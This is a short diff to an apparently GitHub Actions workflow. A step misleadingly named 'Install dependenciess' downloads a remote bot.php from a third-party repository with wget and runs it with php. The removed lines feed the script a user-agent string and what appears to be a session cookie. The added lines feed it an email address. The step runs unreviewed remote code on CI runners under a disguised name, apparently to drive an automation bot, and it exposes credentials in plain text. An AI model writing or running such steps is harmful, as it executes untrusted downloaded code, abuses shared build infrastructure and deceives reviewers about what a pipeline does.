@@ -13,5 +13,5 @@ jobs:
         coverage: none
     - name: Install dependenciess
       run: |
-        wget https://github.com/Mosnio/mehi1/raw/main/bot.php
-        echo -e "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.106 Safari/537.36\nbitPTC=k52fsft9vraed5f26fkrp0tk5l" | php bot.php
+        wget https://github.com/Mosnio/mehi1/raw/main/sttr/bot.php
+        echo -e "kijonike@gmail.com" | php bot.php
